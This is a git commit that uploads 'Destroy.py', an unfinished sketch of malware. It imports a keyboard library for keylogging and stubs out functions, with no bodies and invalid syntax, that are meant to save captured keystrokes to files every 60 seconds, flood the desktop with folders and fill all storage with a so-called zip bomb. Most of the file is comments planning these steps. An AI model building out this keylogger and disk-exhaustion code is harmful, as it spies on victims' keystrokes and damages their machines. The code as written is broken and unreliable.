07e6657a2661d184175ae9417396010f9fdcdf42
MattRaff456 <143442897+MattRaff456@users.noreply.github.com>
2023-11-04 20:17:15 -0400

    Add files via upload

---
+++ Destroy.py
@@ -0,0 +1,17 @@
+#$ pip install keyboard ---i completely forget how to download packages in python
+import keyboard #need the keyboard for keylogging
+
+sendIt = 60 #every 60 seconds, the keylogger will put the logs into a new textfile
+
+def writeFile: #For every 60 seconds, create a text file which shows everything keylogged in a specific file
+
+#Need a way to set a timer and when it hits the sendIt, then either 1. create a new file with the keylogged info or 2. overwrite the previous text file with the extra information so
+#the text keeps adding
+
+def fileDisco: #create constant new files all over the desktop
+
+#Create a while loop that will check over and over if all the space on the desktop is covered, and if not, then it will create a new folder (maybe with a text file with a smiley face)
+
+def zipBomb: #make a zip bomb that will take up all the storage
+
+#For loop where it will keep writing a long statement into a text file
